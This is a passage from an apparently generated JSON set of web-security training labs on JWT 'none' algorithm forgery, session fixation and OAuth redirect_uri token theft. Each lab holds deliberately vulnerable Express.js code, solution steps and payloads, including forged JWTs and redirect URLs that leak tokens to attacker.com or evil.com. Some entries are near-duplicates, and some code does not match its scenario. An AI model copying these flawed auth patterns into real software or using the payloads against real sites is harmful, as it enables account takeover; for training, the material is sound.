        "Lab Description": "The server trusts JWTs without properly verifying their signature when the algorithm is set to 'none'. The application decodes and accepts tokens without validation. To solve: craft a JWT with admin privileges using 'alg':'none' and access the admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request and extract the Authorization Bearer token.",
          "Decode JWT at jwt.io and inspect the header and payload.",
          "Replace the 'alg' value with 'none' and change 'role' to 'admin' in the payload.",
          "Remove the signature part and reassemble the token using base64-encoded header and payload only.",
          "Send the modified token in Authorization header and access /admin to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, 'supersecret'); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "Authorization: Bearer [Modified JWT]",
          "Use jwt.io to craft unsigned JWT manually"
        ]
      },
      {
        "Lab scenario": "Blind session hijacking via verbose error leakage",
        "Lab Description": "The application exposes detailed error logs that include session identifiers when unexpected input is provided. The error handler returns stack traces with sensitive tokens. To solve: force a 500 error, extract another user's session ID from the error, and use it to impersonate them.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Send malformed input (e.g., null or object) in authenticated parameter to /profile using Postman.",
          "Trigger internal server error and observe verbose stack trace in the response.",
          "Extract session ID or token leaked in the error response (e.g., req.session or cookies).",
          "Use Burp Suite to resend a request to /my-account with the stolen session ID set in Cookie header.",
          "Confirm successful hijack by seeing another user's account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oopsdebug', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/profile', (req, res) => { try { let settings = req.body.settings.theme.toLowerCase(); res.send('Updated'); } catch (err) { res.status(500).send('Internal Error: ' + err.stack); } }); app.get('/my-account', (req, res) => { res.send('Hello ' + req.session.user); }); app.listen(4000, () => console.log('Verbose Logging Lab running'));",
        "payloads": [
          "{ \"settings\": null }",
          "{ \"settings\": {\"theme\": null} }",
          "POST /profile with JSON causing TypeError",
          "Set-Cookie: session=stolen-session-id"
        ]
      },
      {
        "Lab scenario": "JWT signature validation bypass in authorization middleware",
        "Lab Description": "The backend uses a custom JWT verification logic with a flawed secret check. The application uses the token to grant access to protected admin APIs. However, it fails to properly validate the token signature. To solve: craft a tampered JWT that grants admin access and view the protected admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite after logging in.",
          "Decode the token using jwt.io and observe the algorithm used (e.g., HS256).",
          "Modify the payload to `{ \"role\": \"admin\" }` and change algorithm to `none`.",
          "Remove the signature entirely and resend the token via Postman in an Authorization header.",
          "Access /admin/dashboard endpoint and confirm admin access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(403).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { const verified = jwt.verify(token, secret); req.user = verified; next(); } catch (err) { res.status(401).send('Invalid token'); } }); app.get('/admin/dashboard', (req, res) => { if (req.user.role !== 'admin') return res.status(403).send('Admins only'); res.send('Welcome to the admin dashboard'); }); app.listen(3000, () => console.log('JWT Bypass Lab running'));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"carlos\", \"role\": \"admin\" }"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allows token reuse from different client",
        "Lab Description": "The OAuth implementation does not validate the client ID or redirect URI properly. The attacker can reuse a legitimate token issued for another application to gain unauthorized access. To solve: obtain a valid OAuth token and use it to impersonate Carlos by accessing the /me endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth flow during your own login to obtain an access token.",
          "Note that the access token is valid across clients due to lack of client_id binding.",
          "Send a request to `/me` with Authorization: Bearer <token> using Postman.",
          "Manipulate the token (if JWT-based) to impersonate Carlos or replay the same token.",
          "Confirm that the endpoint returns Carlos’s data to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'legit-token-123': { username: 'carlos', email: 'carlos@example.com' } }; app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token || !tokens[token]) return res.status(401).send('Invalid or missing token'); req.user = tokens[token]; next(); }); app.get('/me', (req, res) => { res.json({ message: `Hello, ${req.user.username}`, email: req.user.email }); }); app.listen(4000, () => console.log('OAuth Lab running on http://localhost:4000'));",
        "payloads": [
          "Authorization: Bearer legit-token-123",
          "Authorization: Bearer eyJhbGciOi... (if token is JWT-based and predictable)"
        ]
      },
      {
        "Lab scenario": "Session fixation via login token reuse in cookie",
        "Lab Description": "The application accepts a session ID in a GET parameter and reflects it back into a Set-Cookie response during login. It does not regenerate the session on login, enabling session fixation. To solve: force a victim to use a known session ID and take over their session after login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Send a GET request to /login?session=attacker123 using Burp Repeater.",
          "Observe the Set-Cookie header that includes session=attacker123.",
          "Craft a phishing link to /login?session=attacker123 and send to the victim.",
          "Wait for the victim to log in. The session remains fixed.",
          "Use the same session ID (attacker123) in your browser’s cookie and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session || 'newsession'; res.setHeader('Set-Cookie', `session=${session}`); res.send('<form method=POST>Username: <input name=username><input type=submit></form>'); }); app.post('/login', (req, res) => {  res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') res.send('Access granted to attacker'); else res.send('Generic account page'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "/login?session=attacker123",
          "Set-Cookie: session=attacker123",
          "Cookie: session=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth session fixation in authorization endpoint",
        "Lab Description": "The application improperly handles session tokens during the OAuth authorization flow. It allows pre-setting session cookies before the victim logs in, resulting in a session fixation attack. The application accepts a `session_id` from an attacker-controlled domain. To solve: hijack Carlos's session after they authorize the app and access their account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept an OAuth login request from a legitimate user to identify the session_id cookie flow.",
          "Observe that the session cookie can be pre-set using a crafted GET request with a fixed session_id value.",
          "Craft a malicious OAuth authorization URL with a fixed `session_id` and send it to the victim via a phishing domain.",
          "Once the victim logs in and authorizes the app, reuse the fixed session_id to access the victim’s authenticated session.",
          "Visit /my-account using the hijacked session to confirm the exploit."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/auth', (req, res) => { const { session_id, redirect_uri } = req.query; if (session_id) { res.cookie('session_id', session_id); } res.redirect(redirect_uri); }); app.get('/callback', (req, res) => { const user = { username: 'carlos' }; sessions[req.cookies.session_id] = user; res.send('Authorization complete.'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session_id]; if (user) return res.send(`Account page of ${user.username}`); return res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('OAuth Lab running'));",
        "payloads": [
          "https://target.com/auth?session_id=abc123&redirect_uri=https://target.com/callback",
          "Cookie: session_id=abc123",
          "GET /my-account HTTP/1.1"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm",
        "Lab Description": "The app uses JWT tokens to manage sessions but does not validate the algorithm specified in the header. It trusts tokens signed with 'none', allowing attackers to forge valid tokens. To solve: forge a JWT for the user 'carlos' and access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT token using Burp Suite after logging in.",
          "Decode the JWT using jwt.io or Postman and observe the algorithm field in the header (e.g., 'HS256').",
          "Modify the header to use 'alg':'none' and payload to impersonate 'carlos'. Remove the signature part.",
          "Use Burp or Postman to send the forged JWT in the Authorization header.",
          "Access /dashboard and confirm Carlos’s user context to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); return res.send(`Welcome ${user.username} (unauthenticated)`); } try { const verified = jwt.verify(token, 'secret'); return res.send(`Welcome ${verified.username}`); } catch { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "Authorization: Bearer <forged-token>",
          "GET /dashboard HTTP/1.1"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect and token leakage",
        "Lab Description": "The OAuth integration with a third-party identity provider allows open redirect URLs and token leakage via the redirect_uri parameter. The app does not validate the redirect URI properly, allowing attackers to intercept tokens. To solve: capture an OAuth access token belonging to Carlos and use it to access his protected resource.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Launch the OAuth login flow with Burp and observe the redirect_uri used in the request.",
          "Identify that the app does not validate redirect_uri domains against a whitelist.",
          "Set up a listener (e.g., via RequestBin or Postman Echo) and craft a login URL with your malicious redirect_uri.",
          "Send the malicious login link to Carlos. When Carlos logs in, the token is leaked to your server.",
          "Replay the stolen token in a request to the resource server and access Carlos’s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/login', (req, res) => { const { redirect_uri } = req.query; const token = 'access-token-for-carlos'; res.redirect(`${redirect_uri}#token=${token}`); }); app.get('/resource', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.send('Carlos’s sensitive data'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
        "payloads": [
          "https://target.com/oauth/login?redirect_uri=https://attacker.com/capture",
          "https://attacker.com/capture#token=access-token-for-carlos",
          "Authorization: Bearer access-token-for-carlos"
        ]
      },
      {
        "Lab scenario": "Cookie-based session fixation vulnerability in login flow",
        "Lab Description": "The application implements session handling using a fixed session ID stored in a cookie, but it fails to regenerate the session ID upon successful login. The application reuses the session cookie across unauthenticated and authenticated states. To solve: hijack Carlos's session by fixing their session ID pre-login and accessing their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a request before login and observe the 'sessionId' cookie being set.",
          "2. Send a crafted phishing link to the victim that includes a fixed sessionId in the cookie header.",
          "3. Victim logs in using the malicious link; their session is now authenticated using the attacker's fixed sessionId.",
          "4. Use the same sessionId in your browser to access authenticated resources as Carlos.",
          "5. Visit /my-account endpoint to verify successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 's3cr3t' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionId = req.cookies.sessionId; sessions[sessionId] = { user: username }; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionId]; if (session) { res.send(`Welcome, ${session.user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "Set-Cookie: sessionId=attacker123",
          "Crafted phishing URL with fixed cookie",
          "Use same sessionId post-login to access /my-account"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in authorization header",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session validation but fails to validate the algorithm field properly. It accepts tokens signed with 'none' algorithm, allowing attackers to forge tokens without a valid signature. To solve: forge a JWT to impersonate Carlos and access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in and capture the JWT token from the Authorization header using Burp Suite.",
          "2. Decode the JWT header and payload using jwt.io.",
          "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"carlos\"}.",
          "4. Remove the signature and encode the new token.",
          "5. Use Postman to send a request to /profile with the modified JWT in the Authorization header to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'secretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret); res.json({ token }); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const { username } = decoded.payload; return res.send(`Welcome ${username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Tampering Lab running on http://localhost:4000'));",
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\"}",
          "Modified JWT: [base64(header)].[base64(payload)]."
        ]
      },
      {
        "Lab scenario": "OAuth open redirect vulnerability in redirect_uri parameter",
        "Lab Description": "The application integrates with a third-party OAuth provider for login but does not validate the 'redirect_uri' parameter. An attacker can manipulate the redirect URL to leak the access token to their domain. To solve: steal Carlos's OAuth token by crafting a malicious redirect.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to inspect the OAuth flow, specifically the 'redirect_uri' parameter in the /authorize request.",
          "2. Craft a malicious URL like /oauth/authorize?redirect_uri=https://attacker.com/callback.",
          "3. Send the malicious URL to Carlos as a phishing link.",
          "4. When Carlos clicks the link and authenticates, the access token is redirected to attacker's domain.",
          "5. Use the stolen token in Postman to access the /my-account endpoint as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { carlos: 'abcd1234' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = tokens[user];  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abcd1234') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
        "payloads": [
          "https://victim.com/oauth/authorize?redirect_uri=https://attacker.com/callback",
          "#access_token=abcd1234",
          "Authorization: Bearer abcd1234"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable token in login URL",
        "Lab Description": "The application uses a session token passed via the URL. It fails to invalidate pre-authentication tokens during login. This allows attackers to fix a session and hijack it post-login. The application maintains the same session identifier before and after successful authentication. To solve: Hijack Carlos's session after forcing him to log in with a fixed token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login?session=abc123 request made before login and note the token.",
          "2. Register a new user and confirm that the token remains the same before and after login.",
          "3. Craft a phishing link with ?session=abc123 and send it to Carlos.",
          "4. After Carlos logs in via the phishing link, the session will be authenticated and bound to token abc123.",
          "5. Use the same token to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.sessionID = req.query.session || req.sessionID; res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { req.session.user = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send('Account details for ' + req.session.user); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
        "payloads": [
          "GET /login?session=abc123",
          "POST /login with session=abc123 cookie",
          "GET /my-account with session=abc123 cookie"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass using 'none' algorithm",
        "Lab Description": "The application uses a JSON Web Token (JWT) to manage sessions. It accepts tokens signed with the 'none' algorithm and skips signature verification, allowing attackers to forge tokens. To solve: Modify a JWT to impersonate the admin user and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman or Burp Suite to intercept the Authorization: Bearer <JWT> header after login.",
          "2. Decode the JWT using jwt.io or any local JWT tool.",
          "3. Replace the payload with {\"username\": \"admin\"} and set alg to 'none' in the header.",
          "4. Remove the signature section from the JWT.",
          "5. Send the modified token as Authorization: Bearer <forged JWT> and access /admin."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, secret); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); if (payload.username === 'admin') return res.send('Welcome admin'); } else { jwt.verify(token, secret); return res.send('Valid JWT'); } } catch (e) { return res.status(403).send('Forbidden'); } }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\": \"none\"}",
          "Payload: {\"username\": \"admin\"}",
          "Final JWT: <base64(header)>.<base64(payload)>."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
        "Lab Description": "The application integrates with a third-party OAuth provider. It fails to validate the redirect_uri strictly, allowing attackers to inject their own malicious redirect. The attacker can steal the authorization code and redeem it for an access token. To solve: Hijack the OAuth flow and log in as the victim user.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Initiate the OAuth login and intercept the redirect_uri parameter using Burp Suite.",
          "2. Modify the redirect_uri to a malicious URL you control, e.g., https://evil.com/callback.",
          "3. Send the manipulated URL to the victim (Carlos) to click and log in.",
          "4. On your evil server, capture the authorization code sent as a query parameter.",
          "5. Exchange the stolen code using Postman for an access token and call /userinfo to validate login."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') res.send('Login successful via OAuth'); else res.status(400).send('Invalid'); }); app.listen(5000);",
        "payloads": [
          "https://target.com/auth?redirect_uri=https://evil.com/callback",
          "https://evil.com/callback?code=fake-auth-code",
          "POST /token with code=fake-auth-code",
          "GET /userinfo with Bearer token"
        ]
      },
      {
        "Lab scenario": "Persistent Session Fixation in Login Flow",
        "Lab Description": "This lab demonstrates a session fixation vulnerability within the authentication process. The application maintains the same session ID across unauthenticated and authenticated states. To solve: hijack Carlos's session by fixing a known session ID prior to login, then access his My Account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the unauthenticated session and observe the Set-Cookie header.",
          "Send a phishing link to Carlos embedding a fixed session ID using the session cookie manually set in the browser.",
          "After Carlos logs in using that session, hijack the session ID (from logs or capture).",
          "Replay the fixed session cookie in your browser to gain access to his authenticated session.",
          "Visit /my-account to verify access and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: '1234' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionID; sessions[sid] = username; return res.send('Logged in'); } return res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionID; if (sessions[sid]) return res.send('Account of ' + sessions[sid]); res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('Lab running'));",
        "payloads": [
          "GET /login with Cookie: sessionID=attackersession",
          "Send phishing link with: document.cookie = \"sessionID=attackersession\"",
          "Replay stolen cookie after login: Cookie: sessionID=attackersession"
        ]
      },
      {
        "Lab scenario": "JWT tampering with 'none' algorithm exploit",
        "Lab Description": "This lab uses JWT for session management but does not properly enforce signature verification. The server accepts unsigned tokens if the algorithm is set to 'none'. To solve: forge an unsigned JWT with the username 'carlos' and access his My Account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the login request and extract the JWT from the Authorization header.",
          "Decode the token using jwt.io and observe the 'alg' field in the header.",
          "Craft a new token with alg=none and payload {\"username\":\"carlos\"}, removing the signature.",
          "Send the forged token via Postman in the Authorization: Bearer header.",
          "Visit /my-account to verify successful access and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'secretkey'; app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user) return res.send(`Welcome ${req.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Lab Running'));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "JWT: <base64(header)>.<base64(payload)>.",
          "Authorization: Bearer <forged-jwt>"
        ]
      },
      {
        "Lab scenario": "OAuth Redirect URI Manipulation",
        "Lab Description": "This lab uses OAuth 2.0 for third-party login. The application fails to validate the redirect_uri properly. This allows redirection to an attacker-controlled page after login. To solve: intercept the OAuth flow, modify the redirect URI, and capture Carlos's access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Initiate login using the OAuth provider and intercept the request using Burp Suite.",
          "Modify the 'redirect_uri' parameter to point to your malicious server (e.g. http://evil.com/callback).",
          "Host a listener on your server to capture the authorization code or access token.",
          "Use the stolen token to access the protected API or session endpoint as Carlos.",
          "Verify by accessing /my-account while impersonating Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthConfig = { client_id: 'abc123', client_secret: 'shhh', redirect_uri: '', token_endpoint: 'https://provider.com/token' }; app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post(oauthConfig.token_endpoint, { code, redirect_uri, client_id: oauthConfig.client_id, client_secret: oauthConfig.client_secret }); const token = tokenRes.data.access_token; res.send('Token: ' + token); } catch { res.status(500).send('Token exchange failed'); } }); app.listen(5000, () => console.log('OAuth Lab running'));",
        "payloads": [
          "Original URL: /authorize?redirect_uri=https://vulnerable.com/oauth/callback",
          "Malicious: /authorize?redirect_uri=http://attacker.com/callback",
          "Capture: http://attacker.com/callback?access_token=xyz",
          "Replay: Authorization: Bearer xyz"
        ]
      },
      {
        "Lab scenario": "JWT tampering via leaked secret in error logs",
        "Lab Description": "The application uses JWT for session management but leaks the signing secret via verbose error messages. A malformed JWT results in a signed error that reveals the secret. The application accepts manipulated JWTs if they are correctly signed. To solve: Forge an admin JWT token and access the /admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to send a tampered JWT in the Authorization header to /profile.",
          "2. Observe server error response in JSON; look for stack trace or 'JsonWebTokenError' with secret details.",
          "3. Extract the secret key and use jwt.io to craft a new token with payload {\"username\":\"admin\",\"role\":\"admin\"}.",
          "4. Sign it using the disclosed secret and use Burp Suite to replace the old token in an authenticated request.",
          "5. Send a GET request to /admin and confirm access to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = process.env.JWT_SECRET || 'devsecret'; app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.json({ user: decoded.username }); } catch (err) { res.status(500).json({ error: err.message, stack: err.stack }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') return res.send('Admin panel'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.<signature_with_leaked_secret>",
          "Authorization: Bearer <forged_JWT_token>"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in callback",
        "Lab Description": "The application uses a third-party OAuth provider to log in users. However, the redirect_uri parameter is not strictly validated, allowing attackers to inject their own callback endpoints. This enables account takeover via token theft. To solve: Intercept the OAuth code and use it to access Carlos's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the initial OAuth login request to /auth?provider=oauth.",
          "2. Modify the redirect_uri to your malicious server (e.g., https://attacker.com/callback) and forward the request.",
          "3. On your attacker server, capture the authorization code from the callback.",
          "4. Use Postman to exchange the code for an access_token at /auth/token.",
          "5. Replay the token as Authorization: Bearer <token> to /profile and access Carlos’s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'app123'; const CLIENT_SECRET = 'secret'; const oauthProvider = 'https://oauth.example.com'; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${oauthProvider}/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post(`${oauthProvider}/token`, { form: { code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code' } }, (err, r, body) => { const accessToken = JSON.parse(body).access_token; res.send(`Logged in with token: ${accessToken}`); }); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
        "payloads": [
          "https://attacker.com/callback",
          "GET /auth?provider=oauth&redirect_uri=https://attacker.com/callback",
          "Captured code=xyz from attacker-controlled callback",
          "Authorization: Bearer <token>"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The application assigns a session ID in a cookie before authentication and does not regenerate it upon login. Attackers can force a known session ID on victims, then log in using that ID themselves. To solve: Fixate a session, force Carlos to use it, and then access his account via the same ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Chrome or Burp to capture a GET /login request and observe session cookie (e.g., sid=xyz123).",
          "2. Use phishing or an open redirect to trick Carlos into authenticating while using that same session ID.",
          "3. Once Carlos logs in, use Burp Suite to access /my-account using the fixed session (sid=xyz123).",
          "4. Confirm that the session is now linked to Carlos's account.",
          "5. Access /my-account to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'fixme', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'mypassword' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.user = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Logged in as ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
        "payloads": [
          "Cookie: sid=xyz123 (before login)",
          "GET /login using attacker-controlled sid",
          "GET /my-account using same sid after victim logs in"
        ]
      },
      {
        "Lab scenario": "Tampered JWT leads to admin privilege escalation",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) to manage authentication and access control. The server uses the 'none' algorithm to verify tokens but does not enforce proper signature validation. The application trusts the user-supplied JWT without verifying its integrity. To solve: Modify your own JWT to escalate to the admin role and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture a valid login request and extract the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or jwt_tool and inspect its header and payload.",
          "3. Modify the 'alg' field in the JWT header to 'none' and change the 'role' in the payload to 'admin'.",
          "4. Remove the signature portion of the JWT entirely.",
          "5. Use Postman to send a GET request to /admin-dashboard with the modified JWT in the Authorization header to gain access."
        ],
        "Vulnerability name": "Authentication",
